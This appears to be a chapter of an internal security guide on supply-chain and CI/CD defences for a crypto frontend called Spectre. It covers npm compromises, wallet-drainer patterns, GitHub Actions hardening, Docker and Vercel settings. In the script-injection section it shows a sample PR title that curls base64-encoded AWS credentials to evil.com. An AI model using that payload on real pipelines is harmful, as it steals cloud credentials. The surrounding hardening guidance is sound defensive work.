# 06 - Supply chain and CI/CD

A03:2025 in OWASP web Top 10, promoted from #6 in 2021. Supply chain is the category that converted from "scary in theory" to "hits monthly in 2025." For a crypto frontend like Spectre, the supply chain *is* the security perimeter: a compromised dependency in your build runs in every user's browser, same context as `window.ethereum`.

## 6.1 The 2025 supply chain landscape

The defining attacks of 2025, in chronological order:

- **February 2025: Bybit $1.5B.** Lazarus compromised a Safe{Wallet} developer's machine via social engineering, then injected malicious JS into Safe's S3 bucket. The script was loaded by Bybit signers, swapped the multisig proxy's masterCopy, and drained the cold wallet. Off-chain breach → on-chain catastrophic loss. The blueprint for the rest of the year.
- **March 2025: tj-actions/changed-files (CVE-2025-30066).** Attacker compromised a maintainer PAT, modified multiple version tags to point to a malicious commit. Action printed CI secrets to logs. ~23,000 repos affected. Anyone using `tj-actions/changed-files@v45` got hit until the tag was reverted.
- **March 2025: reviewdog/action-setup.** Similar tag-tampering. Cascaded into more secret leaks.
- **June 2025: CoinMarketCap.** Supply chain attack via the homepage doodle image. Malicious JS triggered a fake wallet-connect popup, drained ~$43K across 110 victims. The compromise was a third-party tool, not CMC's own servers.
- **August/September 2025: npm `chalk`/`debug`/`error-ex`/`color-convert` and 14 others.** Phishing attack on maintainer "qix" using a fake `npm support` domain. 18 packages, ~2.6B weekly downloads combined. Payload was a multi-chain crypto drainer hooking `window.ethereum` and Solana wallet APIs to rewrite transactions before signing.
- **December 2025: React CVE-2025-55182.** SEAL observed a "big uptick in drainers uploaded to legitimate crypto websites" via this vector.
- **December 2025: Trust Wallet browser extension backdoor.** Exfiltrated mnemonic phrases for weeks before detection.

The pattern: phishing the human maintainer, compromising a developer machine, or hijacking infrastructure. All produce the same end state - malicious code running with the trust of a legitimate package.

---

## 6.2 npm and dependency compromises

**Attack types:**

- **Maintainer takeover.** Phishing, credential stuffing, lapsed npm account 2FA. The September 2025 chalk attack was this.
- **Typosquatting.** `lodash-utils` instead of `lodash`. `expres` instead of `express`. Reams of these.
- **Dependency confusion.** Internal package name `@spectre/utils` published publicly on the public npm registry. CI fetches the public version first. Alex Birsan's original 2021 research; still happening in 2025.
- **Brandjacking / namespace squatting.** Buy abandoned package names that look like company names.
- **Postinstall malware.** Even a `npm install` without `import` of the package triggers postinstall scripts.
- **Build-time payloads.** Code runs during `npm run build`, exfiltrates secrets from the build environment.
- **Runtime payloads.** Code runs when the bundle loads in the user's browser. The drainer pattern.

**Detection.**

```bash
# basic audit
npm audit
npm audit --json | jq '.vulnerabilities | to_entries | length'

# dependency tree
npm ls --all > tree.txt
wc -l tree.txt  # most React apps have 1000+ deps. Yes, really.

# postinstall hunt
find node_modules -name package.json -exec grep -l '"postinstall"' {} \; 2>/dev/null | wc -l

# Socket.dev (better than npm audit for catching new bad packages)
npx @socketsecurity/cli scan

# package-lock review on every PR
git diff main -- package-lock.json | head -100
```

**Fix.**

- **Pin everything.** Use `npm ci` in CI (uses lockfile exactly, fails if lockfile drifts). Never `npm install` in CI.
- **Pin by exact version.** `^1.2.3` and `~1.2.3` accept patch/minor updates automatically. Use exact versions for security-sensitive packages.
- **Lockfile in PR review.** Any change to `package-lock.json` must be inspected, including transitive deps.
- **Subresource Integrity** for CDN-loaded scripts (covered in 6.4).
- **Socket.dev or Snyk or Aikido** monitoring. They catch suspicious package behavior at install time (postinstall scripts, network calls in install, obfuscated code, new packages from unknown authors).
- **2FA on the npm account** for any package Spectre publishes. WebAuthn preferred.
- **Org-scoped npm token** for CI publish, with read/write split. Read-only token for fetching; write token only used in publish step.
- **Verify package integrity at install.** Many private registries (Verdaccio, Artifactory, GitHub Packages) support immutable mirrors of npm. Once you've audited a version, it can't change under you.
- **Periodic dep audit.** Quarterly: review what's installed, prune what's unused, update what's outdated.

---

## 6.3 The drainer-in-dependency pattern

Specific to Web3 frontends. The pattern from September 2025:

1. Maintainer of a small but widely-depended-on package gets phished.
2. Attacker publishes a new version with extra code that:
   - Hooks `window.ethereum` (intercepts MetaMask)
   - Hooks `window.solana` (intercepts Phantom)
   - Watches for transaction creation
   - Rewrites the destination address before the wallet signs
   - Or generates fake approval requests that look like the legitimate flow
3. Within hours, the malicious version is installed in CI pipelines worldwide.
4. Within days, it's in production bundles served to millions of users.
5. Drainer collects until detection.

**Defense for Spectre:**

- **Wallet-connected surfaces on dedicated subdomains** with minimal dependencies. The fewer packages run on the same origin as `window.ethereum`, the smaller the attack surface.
- **CSP `connect-src` allowlist.** Even if a drainer is in your bundle, it can't talk to its C2 server if your CSP only allows your own API host. Strict allowlist is a meaningful brake.
- **Subresource Integrity** on every external script.
- **Run a deploy diff.** Every Vercel deploy: what bundles changed since last deploy? A new chunk from `node_modules/some-package` that wasn't there yesterday is worth questioning.
- **Pin direct dependencies; review transitive ones too.** The September 2025 attack came through `debug` and `chalk` - packages most people have transitively but never list directly. Lockfile is the source of truth.

---

## 6.4 CDN and third-party scripts

**Attack.** You load a script from a CDN you don't control. The CDN gets compromised, or the file at that URL changes. Now you're shipping the attacker's code.

The CoinMarketCap June 2025 attack was effectively this: a third-party "doodle" image with associated JS got modified, every CMC visitor got the drainer popup.

**Fix.**

- **Self-host where possible.** Copy the script into your bundle. You control the version.
- **Subresource Integrity (SRI) for everything you can't self-host:**
  ```html
  <script
    src="https://cdn.example.com/foo.js"
    integrity="sha384-base64hash..."
    crossorigin="anonymous"
  ></script>
  ```
  Browser refuses to execute if the hash doesn't match. The attacker would need to compromise both the CDN AND your HTML to change the integrity hash too.
- **Pinned versions.** Never `latest`. `unpkg.com/foo@2.3.4` not `unpkg.com/foo`.
- **Strict CSP `script-src` allowlist.** Hosts only, no wildcards.
- **Audit your `<script>` and `<link>` tags.** Every external one is a trust decision. Document it.

For analytics specifically: prefer privacy-respecting, self-hostable options (Plausible, PostHog with cloud or self-hosted), or proxy through your own domain so a CDN compromise doesn't reach your origin.

---

## 6.5 GitHub Actions and CI/CD

CI/CD is a high-value target because it runs with secrets and writes to production. Two defining incidents:

- **2021 Codecov.** Compromised bash uploader exfiltrated env vars from thousands of CI runs.
- **2025 tj-actions/changed-files (CVE-2025-30066).** Compromised action printed secrets to logs.

Both: third-party tool in CI, secrets in env, compromised tool reads env, secrets leak.

**OWASP CI/CD Top 10 categories worth knowing:**

- **CICD-SEC-1 Insufficient Flow Control.** PRs can deploy without review. Branch protection missing.
- **CICD-SEC-2 Inadequate Identity and Access Management.** CI tokens overscoped. Shared service accounts.
- **CICD-SEC-3 Dependency Chain Abuse.** Above section.
- **CICD-SEC-4 Poisoned Pipeline Execution (PPE).** Attacker modifies the pipeline definition itself. Direct (attacker has write to repo) or indirect (attacker modifies a file the pipeline reads, like `package.json` scripts).
- **CICD-SEC-5 Insufficient PBAC.** Pipeline-based access control: pipelines have too many permissions.
- **CICD-SEC-6 Insufficient Credential Hygiene.** Secrets in logs, in CI, in config.
- **CICD-SEC-7 Insecure System Configuration.** Self-hosted runners with no isolation.
- **CICD-SEC-8 Ungoverned Usage of Third-Party Services.** Random GitHub Actions pulled in.
- **CICD-SEC-9 Improper Artifact Integrity Validation.** No signature on deploy artifacts.
- **CICD-SEC-10 Insufficient Logging and Visibility.** Can't tell who deployed what when.

**Specific patterns:**

### `pull_request` vs `pull_request_target`

GitHub Actions has two PR triggers:

- `pull_request`: workflow runs in the *fork* context. No access to secrets, read-only `GITHUB_TOKEN`. Safe for untrusted code.
- `pull_request_target`: workflow runs in the *base* repo context. Has access to secrets, write `GITHUB_TOKEN`. **Designed for trusted operations only.**

Common bug: using `pull_request_target` for convenience (so the workflow can comment on the PR) AND checking out the PR code (`actions/checkout` with `ref: pull_request.head.sha`). Now untrusted PR code runs with full secret access.

**Fix.** Don't run untrusted PR code under `pull_request_target`. If you need to comment on a PR with results, split into two workflows: one runs untrusted, produces artifact; the other (triggered by `workflow_run`) reads the artifact and comments.

### Script injection via workflow expressions

```yaml
# BROKEN
- run: echo "PR title: ${{ github.event.pull_request.title }}"
```

PR title is attacker-controllable. They submit a PR with title `"; curl evil.com/$(cat ~/.aws/credentials | base64); echo "`. The expression is substituted directly into the shell command. RCE in CI.

**Fix.** Pass through env vars:

```yaml
- run: echo "PR title: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

Shell expansion of `$TITLE` is safe because it's not interpreted as shell syntax.

### Pinning actions

```yaml
# BROKEN
- uses: tj-actions/changed-files@v45

# SAFE
- uses: tj-actions/changed-files@a284dc1814e3fd07f2e34267fc8f81227ed29fb8
```

Tags can be moved by maintainers (or attackers with access). Commit SHAs cannot. Pin by SHA for every third-party action.

Trade-off: you don't get automatic updates. Use Dependabot to bump pinned SHAs on a known schedule.

### Self-hosted runners

If you use self-hosted runners (Spectre likely doesn't, but worth knowing):

- Public repos with self-hosted runners are dangerous. Anyone can submit a PR that runs on your runner.
- Use ephemeral runners (fresh VM per job).
- Isolate runners from internal networks.
- Audit runner registration tokens regularly.

### `GITHUB_TOKEN` permissions

Workflows get a `GITHUB_TOKEN` with default permissions (often too broad). Tighten:

```yaml
permissions:
  contents: read
  pull-requests: write
```

Default is `read-all` or `write-all` depending on settings. Set explicit minimal permissions in every workflow.

### Secrets and OIDC

- GitHub repo secrets: scoped per repo.
- GitHub environments: secrets scoped per environment with optional approval gates.
- GitHub OIDC: short-lived tokens issued by GitHub, redeemable for cloud creds. Way better than long-lived AWS/GCP keys in repo secrets.

**For Spectre on Vercel:** Vercel deployments are typically triggered by GitHub. The Vercel deploy token in GitHub Actions secrets should be: scoped to the specific Vercel project, rotatable, with deploy permissions only (not read all environments). Same model for any AWS/GCP integration.

---

## 6.6 Docker and container security

If Spectre runs containers (the OVH blockchain nodes likely do):

**Attacks:**

- **Base image compromise.** `FROM debian:latest` → image tag pulls whatever debian published today, could be malicious. Use digest pinning: `FROM debian:bullseye-slim@sha256:abc123...`.
- **Privileged containers.** `--privileged` flag grants near-host access. Don't use unless required.
- **Exposed Docker daemon.** `dockerd -H tcp://0.0.0.0:2375` is a remote-code-execution backdoor. Bind to socket or use mTLS.
- **Image registry compromise.** Mostly a problem for private registries; public registries are watched.
- **Runtime escapes.** Container breakout via kernel bugs. Keep kernel patched.
- **Capability creep.** `--cap-add SYS_ADMIN` defeats much of the isolation.
- **Volume mounts to host.** `-v /:/host` is game over.

**Fix.**

- Pin base images by digest, not tag.
- Run as non-root inside the container (`USER 1000` in Dockerfile).
- Drop all capabilities, add only what's needed.
- Read-only filesystem where possible (`--read-only`).
- Scan images for known vulns: Trivy, Grype, Snyk Container.
- Sign images and verify signatures (Cosign, Notary).

---

## 6.7 Vercel-specific considerations

Spectre lives on Vercel. Things that matter:

- **Vercel deploy token.** In GitHub secrets. Rotate periodically. Scope to project, not org.
- **Vercel env vars.** Per-environment (Dev / Preview / Prod). Encrypted at rest. Don't share across environments.
- **Preview deployments.** Every PR creates a preview URL. By default, public. For sensitive apps (dev-control, research), make previews require Vercel Password or Vercel Access.
- **Project visibility.** Preview comments and screenshots can leak via Vercel's public dashboard. Verify project settings.
- **Domains.** Vercel-managed domains; verify ownership and renewal.
- **Edge functions and middleware.** Run on Vercel's edge network, have access to env vars. Same secret-handling discipline as regular server code.

For dev-control specifically, post-breach: Vercel Password Protection (Pro+ plan) is appropriate. Or Cloudflare Access in front of the Vercel deployment for SSO-based access.

---

## 6.8 Lockfile attacks and dependency confusion

**Dependency confusion (Alex Birsan, 2021):**

You have an internal package `@spectre/utils` published only to your private registry. Your CI is configured to pull from both private and public npm. Attacker publishes `@spectre/utils` version `99.9.9` to public npm. CI fetches the higher version (public) instead of yours.

**Fix.**

- Scoped packages must be locked to your registry. In `.npmrc`:
  ```
  @spectre:registry=https://registry.your-private-npm.com/
  ```
- Reserve scope names on public npm (publish an empty package) so attackers can't squat.
- Use lockfiles religiously. Lockfile pins exact registries.

**Lockfile poisoning:**

A malicious PR changes `package-lock.json` to point to a different version or registry. If the reviewer doesn't notice (lockfile diffs are huge), you ship the attacker's version.

**Fix.**

- Require lockfile review on every PR.
- Automated check: lockfile changes only allowed in PRs that also change `package.json`.
- Pin registry in the lockfile (newer npm versions do this).

---

## 6.9 Internal package and tooling security

Spectre uses npm workspaces. Internal packages need the same hygiene:

- Workspace packages should publish only if intended. `"private": true` on packages not meant for publication.
- Cross-workspace imports should not import from `dist/` of other packages; import from source.
- Don't put secrets in workspace package config; they get propagated.

---

## 6.10 Build reproducibility

**Goal:** any developer (or you, three months later) can rebuild your production bundle byte-for-byte from the same git SHA and produce the same output. Without this, supply chain integrity is unverifiable.

**Steps:**

- Pin Node.js version (`.nvmrc`, `engines` in package.json).
- Pin package manager version (`packageManager` field).
- `npm ci`, not `npm install`.
- Pin Vite/Webpack/build tool versions.
- Avoid environment-dependent build steps (timestamps in output, etc.).
- Use a deterministic builder (Nix is the gold standard; Docker with pinned base images is practical).

If two clean builds produce different output, something nondeterministic is happening. Fix it. Bybit-style poisoning is much harder to spot if you don't have a known-good byte-for-byte reference.

---

## 6.11 SBOM (Software Bill of Materials)

Generate and store an SBOM for every production deploy. Lets you answer "are we affected by CVE-X" instantly.

```bash
# CycloneDX SBOM
npx @cyclonedx/cyclonedx-npm --output-file sbom.json

# SPDX format
syft . -o spdx-json > sbom.spdx.json
```

Store the SBOM alongside the deploy. When a new CVE drops, grep the SBOM for the affected package across all stored deploys.

---

## 6.12 Spectre supply chain action items

Specific, in order:

1. **Audit current Vercel deploy tokens.** Are they scoped to a single project? Rotate them and re-issue scoped.
2. **Pin every GitHub Action by SHA**, not by tag. Add Dependabot to manage updates. (The tj-actions lesson.)
3. **Enable Socket.dev** (free for OSS) or **Aikido** (has a free tier). Catches the next chalk-class incident before it ships.
4. **Add CSP `connect-src` allowlist** to wallet-connected pages. Limits damage from a future supply chain compromise.
5. **Set `"engines"`** in every package.json. Force the team onto a known Node version.
6. **Lockfile review** as a required PR check. Bot comments on any lockfile change with diff summary.
7. **`npm ci`** in all CI pipelines, never `npm install`.
8. **Subresource Integrity** on the few external scripts you do load. Audit them.
9. **2FA (WebAuthn) on the npm account** if Spectre publishes packages.
10. **Move dev-control behind Vercel Password Protection or Cloudflare Access** (you've already done middleware; the edge layer is belt-and-braces).

---

## 6.13 Quick supply chain audit

```bash
# Current vulnerability state
npm audit --json | jq '.metadata.vulnerabilities'

# Number of transitive dependencies
npm ls --all 2>/dev/null | wc -l

# Postinstall scripts in installed packages
find node_modules -name package.json -exec grep -l '"postinstall"' {} \; 2>/dev/null

# Packages installed but not imported anywhere
npx depcheck

# Outdated packages
npm outdated

# Recently published versions of your top deps
for pkg in $(jq -r '.dependencies | keys[]' package.json); do
  echo -n "$pkg: "
  npm view "$pkg" time --json 2>/dev/null | jq -r ".[\"modified\"]"
done

# Any GitHub Action not pinned by SHA
rg -n 'uses: [^@]+@v[0-9]' .github/workflows/

# Dockerfile FROM lines pinned?
rg -n '^FROM' Dockerfile* | grep -v '@sha256:'
```

---

## 6.14 Further reading

- OWASP CI/CD Top 10: https://owasp.org/www-project-top-10-ci-cd-security-risks/
- Trail of Bits on supply chain assumptions: https://blog.trailofbits.com/2025/09/24/supply-chain-attacks-are-exploiting-our-assumptions/
- GitHub's security hardening for Actions: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
- SLSA framework: https://slsa.dev/
- Alex Birsan on dependency confusion: https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
- Socket.dev: https://socket.dev/
- Aikido: https://www.aikido.dev/
- Bybit incident technical analysis: https://www.nccgroup.com/research/in-depth-technical-analysis-of-the-bybit-hack/
